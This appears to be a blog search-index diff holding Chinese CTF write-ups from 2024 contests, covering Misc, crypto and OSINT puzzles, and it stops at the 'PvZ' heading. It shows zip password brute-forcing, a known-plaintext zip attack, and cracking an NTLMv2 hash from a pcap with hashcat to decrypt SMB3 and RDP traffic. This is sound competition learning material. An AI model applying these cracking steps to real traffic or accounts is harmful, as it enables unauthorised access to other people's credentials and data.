@@ -1,6 +1,507 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2024 睿抗 Misc方向 全WriteUp</title>
+    <url>//post/2024Raicom/</url>
+    <content><![CDATA[<p><s>全国睿抗机器人大赛-网络安全方向</s> 黑盒原题赛 Misc方向全WP</p>
+<p>锐评：排名是看不到的，题目是奇安信杯的，flag是不改的，非预期是可以秒的，拿血是看手速的（为什么Lunatic又比我快一秒，我的二血啊啊啊）</p>
+<h3 id="你是黑客么">你是黑客么</h3>
+<p>打开压缩包发现有密码，纯数字爆破得到密码</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130216341.png"
+                        alt="image-20241019130216341"
+                 ></p>
+<p>010打开发现一个PK头</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130408645.png"
+                        alt="image-20241019130408645"
+                 ></p>
+<p>复制到CyberChef中解base64，然后是一张png文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130533925.png"
+                        alt="image-20241019130533925"
+                 ></p>
+<p>扫码得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130633439.png"
+                        alt="image-20241019130633439"
+                 ></p>
+<p><code>flag&#123;asdf%^&amp;*ghjkl&#125;</code></p>
+<h3 id="循环的压缩包">循环的压缩包</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tarfile&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        </span><br><span class="line">    zip_data = data[<span class="number">512</span>:]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new.zip&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.write(zip_data)</span><br><span class="line">        </span><br><span class="line">    os.mkdir(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">    archive_file = <span class="string">&quot;new.zip&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(archive_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        zip_ref.extractall(path=<span class="string">&quot;tmp/&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;mv tmp/* .&quot;</span>)</span><br><span class="line">        os.rmdir(<span class="string">&quot;tmp&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>写个脚本，flag直接出<code>flag&#123;01af9cbb-6bf2-4ad8-8ecb-9dcbbc02bf19&#125;</code></p>
+<h3 id="Goodtime">Goodtime</h3>
+<p>打开压缩包发现有密码，纯小写字母爆破得到密码<code>city</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019132740995.png"
+                        alt="image-20241019132740995"
+                 ></p>
+<p>解压后发现有一大堆TXT文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019132826320.png"
+                        alt="image-20241019132826320"
+                 ></p>
+<p>发现qwsz.txt有一个03 04 14 00，补上文件头后，猜测所有文件合并起来是一个压缩包，然后就是要确定文件顺序</p>
+<p>看到键盘上<code>qwsz</code>四个按键包围了A，同理<code>vghn</code>包围了B，猜测一共七个对应A-G，确定文件顺序后cyberchef提取压缩包，获得一张<code>owl.png</code>图片</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133049430.png"
+                        alt="image-20241019133049430"
+                 ></p>
+<p>快进到得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133115344.png"
+                        alt="image-20241019133115344"
+                 ></p>
+<blockquote>
+<p>非预期：给qwsz.txt补上50 4B后直接CyberChef导出，使用BandZip解压，虽然会报错，但是依然可以忽略报错正常的拿出owl.png，然后正常LSB即可，因为隐写的数据比较少，集中在前面一部分，所以直接LSB也可以解出</p>
+</blockquote>
+<h3 id="Crypto-变异凯撒">Crypto - 变异凯撒</h3>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">115!111!111!155!1!515!1511!151511!15555!11555!15555!5515!15555!5515!15555!55551!11555!</span><br><span class="line">55551!11555!55111!11555!11115!55111!51111!55555!5515!15555!5515!15555!11111!11555!5555</span><br><span class="line">1!55551!1555!55555!11155!55555!1555!15555!11155!55555!55555!15555!55555!15555!55555!55</span><br><span class="line">555!11111!15555!15555!55555!11111!55555!51111!55551!5!15555!11111!55555!55551!55555!11</span><br><span class="line">115!55555!11555!15555!55555</span><br></pre></td></tr></table></figure>
+<p>将<code>1</code>替换为<code>-</code>， <code>5</code>替换为<code>.</code>，<code>!</code>替换为(空格) ，然后<code>Morse Code</code></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GOODTRY!676F6F64747279215F6F60744B585B68556565506650514E6054595765</span><br></pre></td></tr></table></figure>
+<p>后面那串拿去16进制转字符串</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">_o`tKX[hUeePfPQN`TYWe</span><br></pre></td></tr></table></figure>
+<p>随波逐流一把梭<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133420247.png"
+                        alt="image-20241019133420247"
+                 ></p>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024 古剑山 Misc Crypto方向 部分WriteUp</title>
+    <url>//post/2024gjs/</url>
+    <content><![CDATA[<p>先吐槽：Misc和Crypto两个方向真是抽象到我无语得想笑。早上9.02睡眼惺忪爬起来看题，结果吃了三个小时史导致我中饭都吃不下。</p>
+<h2 id="Misc">Misc</h2>
+<h3 id="蓝书包">蓝书包</h3>
+<p>解压后发现182个加密压缩包，尝试爆破解压密码，发现1.zip对应密码是10001，2.zip密码是10002，以此类推到10182。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181556773.png"
+                        alt="image-20241130181556773"
+                 ></p>
+<p>根据此特点写脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">output_dir = <span class="string">&quot;./output&quot;</span></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">183</span>):</span><br><span class="line">    zip_filename = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.zip&quot;</span></span><br><span class="line">    password = <span class="built_in">str</span>(<span class="number">10000</span> + i).encode()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">            zip_file.extractall(path=output_dir, pwd=password)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;成功解压: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181828909.png"
+                        alt="image-20241130181828909"
+                 ></p>
+<p>完成解压后可以在output目录下看到有saa-szz182个文件，看到saa有png文件头。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181914061.png"
+                        alt="image-20241130181914061"
+                 ></p>
+<p>修改saa为saa.png打开查看发现是很小一张图片，而且缺少文件尾</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182022106.png"
+                        alt="image-20241130182022106"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182044355.png"
+                        alt="image-20241130182044355"
+                 ></p>
+<p>猜测是将所有文件拼接后得到完整的图片，于是写脚本进行拼接</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_file_list</span>():</span><br><span class="line">    file_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> first <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>)):</span><br><span class="line">        <span class="keyword">for</span> second <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> third <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">                file_name = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">chr</span>(first)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(second)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(third)&#125;</span>&quot;</span></span><br><span class="line">                file_list.append(file_name)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(file_list) == <span class="number">182</span>:</span><br><span class="line">                    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line">output_file = <span class="string">&quot;output.png&quot;</span></span><br><span class="line">file_list = generate_file_list()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file_name):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">                outfile.write(infile.read())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;拼接文件: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件未找到: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;合成完成，输出文件为: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182236635.png"
+                        alt="image-20241130182236635"
+                 ></p>
+<p>根据题目名“蓝书包”提示为LSB，使用zsteg和stegsolve后无果，寻找cloacked-pixel的key后无果，尝试爆破cloacked-pixel的密钥，得到密钥为<code>654321</code>，解得flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182458310.png"
+                        alt="image-20241130182458310"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182522787.png"
+                        alt="image-20241130182522787"
+                 ></p>
+<p><code>flag&#123;8719e663c0507cecbff2db103a7f7cd7&#125;</code></p>
+<h3 id="jpg">jpg</h3>
+<p>解压后开局一张图，010查看发现文件末尾有PK头隐写zip文件，使用foremost进行提取</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182921007.png"
+                        alt="image-20241130182921007"
+                 ></p>
+<p>发现文件加密，010查看发现flag.pdf为伪加密，修改加密位后解压得到flag.pdf</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183258118.png"
+                        alt="image-20241130183258118"
+                 ></p>
+<p>尝试复制pdf中的文本后可以得到提示无法选中文本<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183324326.png"
+                        alt="image-20241130183324326"
+                 ></p>
+<p>可以借此猜测该pdf是图片一类的东西导出的，使用Photoshop打开发现存在多个图层</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183449139.png"
+                        alt="image-20241130183449139"
+                 ></p>
+<p>扫码得到一串长度为128的字符</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183929365.png"
+                        alt="image-20241130183929365"
+                 ></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">67f480eff11781617044bd47fb9535cfb0e4b6a09e51daff2107c536e9d4eebb3d517cfea6e3f176d4e0d37a9f3658845f3d1917cfce30a4f44ffa2e0af58485</span><br></pre></td></tr></table></figure>
+<p>看到压缩包内的sha512.txt文件大小也是128，可以猜测这一串文字是sha512.txt的明文，利用这个文件进行明文攻击，新建一个sha512.txt然后压缩查看发现CRC值相同</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184527515.png"
+                        alt="image-20241130184527515"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184632294.png"
+                        alt="image-20241130184632294"
+                 ></p>
+<p>按照相同方式压缩后进行明文攻击，使用<code>ARCHPR</code>直接找到密码（也可以使用bkcrak）</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/aff5dc78aed6d788d64e991a460c225.png"
+                        alt="aff5dc78aed6d788d64e991a460c225"
+                 ></p>
+<p>解压后得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184853098.png"
+                        alt="image-20241130184853098"
+                 ></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flag&#123;10e23151aa0da35221a81dff81a53b4e&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto">Crypto</h2>
+<h3 id="cs">cs</h3>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">截获了一段密文字符串jhjnjcjikmkfjjjkkejkkekdjgjcjnjhjnjcjiko,明文就在其中，请你把它找出来？</span><br></pre></td></tr></table></figure>
+<p>经过尝试，hnci的ascii码减2后为flag，借此猜测j和k是偏移量，可以将这段密文分为两个等长的部分</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jjjjkkjjkjkkjjjjjjjk</span><br><span class="line">hncimfjkekedgcnhncio</span><br></pre></td></tr></table></figure>
+<p>可知偏移量j为2，根据这个爆破偏移量k</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;jjjjkkjjkjkkjjjjjjjk&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;hncimfjkekedgcnhncio&quot;</span></span><br><span class="line"></span><br><span class="line">k_range = <span class="built_in">range</span>(-<span class="number">100</span>,<span class="number">100</span>) </span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> k_range:</span><br><span class="line">    str3 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] == <span class="string">&quot;j&quot;</span>:</span><br><span class="line">            str3 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i]) - <span class="number">2</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str3 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i]) + k)</span><br><span class="line">    results.append(<span class="string">f&quot;k=<span class="subst">&#123;k&#125;</span>: <span class="subst">&#123;str3&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130185545848.png"
+                        alt="image-20241130185545848"
+                 ></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flag&#123;thisisrealflag&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024 强网杯初赛 Misc方向 部分WriteUp</title>
+    <url>//post/2024qwb/</url>
+    <content><![CDATA[<h3 id="givemesecret">givemesecret</h3>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c8c2231ec4b2b987ee88aabff280a0eb.png"
+                        alt="c8c2231ec4b2b987ee88aabff280a0eb"
+                 ></p>
+<h3 id="Master-Of-OSINT">Master Of OSINT</h3>
+<p>图1：看上去像是西北方，应该在内蒙新疆青海一带，最远处有一篇湖，百度地图一个个找过去最终在找到地点：</p>
+<p><code>青海省海南藏族自治州共和县倒湖茶公路</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-1.png"
+                        alt="misc-1"
+                 ></p>
+<p>图2：根据图片最右侧的建筑，有一个明显的百安居，根据这个建筑入手找到<code>上海浦东新区 百安居(龙阳店)</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-2.png"
+                        alt="misc-2"
+                 ></p>
+<p>图4：根据图中卡车所属公司<code>浙通物流</code>，位于杭州萧山，加上我经常去杭州感觉这个隔音栏就像杭州绕城高速 <code>优美爱有限公司附近</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-3.png"
+                        alt="misc-3"
+                 ></p>
+<p>图5：根据建筑立体和蓝白色围栏初步判定在重庆 <code>重庆市九龙坡区谢家湾立交桥</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-4.png"
+                        alt="misc-4"
+                 ></p>
+<p>图6：根据建筑密度和风格判定在东南方大城市，远处有一个类似H形的建筑 <code>南京聚宝楼招待所</code> 附近</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-5.png"
+                        alt="misc-5"
+                 ></p>
+<p>图7：初步判定大城市，有河，远处有一栋特征明显建筑 <code>湖南省长沙市岳麓区五一大道橘子洲大桥</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-6.png"
+                        alt="misc-6"
+                 ></p>
+<p>图8：应该是海，但是颜色不蓝，可能是入海口的地方，有风车 <code>上海市崇明区G40(沪陕高速)</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-7.png"
+                        alt="misc-7"
+                 ></p>
+<p>图9：根据吊桥顶部形状，根据谷歌识图找到这篇文章<a class="link"   href="https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm" >https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm<i class="fas fa-external-link-alt"></i></a> 确定位置：<code>湖北省武汉市青山区武汉天兴洲长江大桥</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-8.png"
+                        alt="misc-8"
+                 ></p>
+<p>图10：根据立交桥一行字<code>中铁三局集团解说促进浙江经济发展</code>，识图找到<code>新塘高铁公园</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-9.png"
+                        alt="misc-9"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-10.png"
+                        alt="misc-10"
+                 ></p>
+<h3 id="谍影重重5-0">谍影重重5.0</h3>
+<p>在协议分级中可以初步判断一下流量的种类</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106154448407.png"
+                        alt="image-20241106154448407"
+                 ></p>
+<p>可以看到有很多加密后的SMB3流量，可以根据这篇博客<a class="link"   href="https://blog.csdn.net/qq_30464257/article/details/142205308" >SMB流量分析<i class="fas fa-external-link-alt"></i></a>了解SMB流量协议的组成，在<code>Frame 122</code>中找到<code>NTLM的Hash</code>，也找到很多RDP流量</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106155124903.png"
+                        alt="image-20241106155124903"
+                 ></p>
+<p>根据这篇文章：</p>
+<p><a class="link"   href="https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password" >https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password<i class="fas fa-external-link-alt"></i></a></p>
+<p>使用tshark导出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -n -r 谍影重重5.0.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160039118.png"
+                        alt="image-20241106160039118"
+                 ></p>
+<p>手动修改为hashcat支持的格式<code>tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000</code></p>
+<p>写入<code>hash.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000&quot;</span> &gt; hash.txt</span><br></pre></td></tr></table></figure>
+<p>然后使用hashcat进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt --show</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160642565.png"
+                        alt="image-20241106160642565"
+                 ></p>
+<p>获得密码<code>babygirl233</code>，在Wireshark中，编辑 -&gt; 首选项 -&gt; Protocols -&gt; NTLMSSP输入password，即可解密SMB3的加密流量</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161029399.png"
+                        alt="image-20241106161029399"
+                 ></p>
+<p>导出SMB对象可以获得一个<code>flag.7z</code>文件和证书文件<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161114873.png"
+                        alt="image-20241106161114873"
+                 ></p>
+<p>这个是本地RDP证书，需要将证书进行解密</p>
+<blockquote>
+<p><a class="link"   href="https://github.com/GoSecure/pyrdp/tree/main/docs" >https://github.com/GoSecure/pyrdp/tree/main/docs<i class="fas fa-external-link-alt"></i></a><br>
+<a class="link"   href="https://www.haxor.no/en/article/analyzing-captured-rdp-sessions" >https://www.haxor.no/en/article/analyzing-captured-rdp-sessions<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>猜测证书是使用猕猴桃导出的（猕猴桃导出的默认密码是<code>mimikatz</code>）使用该密码解密TLS成功，解密后进行PDU导出，过滤器选择<code>OSI Layer 7</code>，导出后选择<code>.pcap文件</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrdp-convert -o output 1.pcap</span><br></pre></td></tr></table></figure>
+<p>转换为pyrdp可读的文件，然后加载<code>pyrdp-player</code>，提取pyrdp文件</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;Return pressed&gt;</span><br><span class="line">&lt;Return released&gt;the</span><br><span class="line">&lt;Shift pressed&gt;</span><br><span class="line">&lt;Shift released&gt;</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;7z</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;password</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;is</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;f&#x27;</span><br><span class="line">&lt;Shift pressed&gt;&#123;</span><br><span class="line">&lt;Shift released&gt;windows</span><br><span class="line">&lt;Shift pressed&gt;_</span><br><span class="line">&lt;Shift released&gt;password</span><br><span class="line">&lt;Shift pressed&gt;&#125;</span><br><span class="line">&lt;Shift released&gt;9347013182&#x27;</span><br><span class="line">&lt;Control pressed&gt;s</span><br><span class="line">&lt;Control released&gt;</span><br><span class="line"></span><br><span class="line"># the 7z password is f&#x27;&#123;windows_password&#125;9347013182&#x27;</span><br></pre></td></tr></table></figure>
+<p>得到解压密码是<code>babygirl2339347013182</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106162323513.png"
+                        alt="image-20241106162323513"
+                 ></p>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024强网拟态Misc方向部分 WriteUp</title>
+    <url>//post/2024qwnt/</url>
+    <content><![CDATA[<p>要我说这个osint真得是神题吧，，社了我一下午加一晚上，直接红温下机（我以后再也不会笑了</p>
+<h3 id="ezflag">ezflag</h3>
+<p>打开流量包，发现直接传输了一个zip压缩包</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105513319.png"
+                        alt="image-20241020105513319"
+                 ></p>
+<p>然后选择 From Hex 然后下载转换后的压缩包即可</p>
+<blockquote>
+<p>Tips: 这里不推荐用CyberChef的magic功能，要不然转出来的压缩包会提示已损坏</p>
+<p>易损坏的压缩包，需要我们自己去修复文件目录区和文件目录结束区</p>
+<p>其实就是多了一位的错误数据</p>
+</blockquote>
+<p>压缩包解压后可以得到一个flag.zip，010查看发现是一张png图片，改后缀为png即可得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105534102.png"
+                        alt="image-20241020105534102"
+                 ></p>
+<h3 id="PvZ">PvZ</h3>
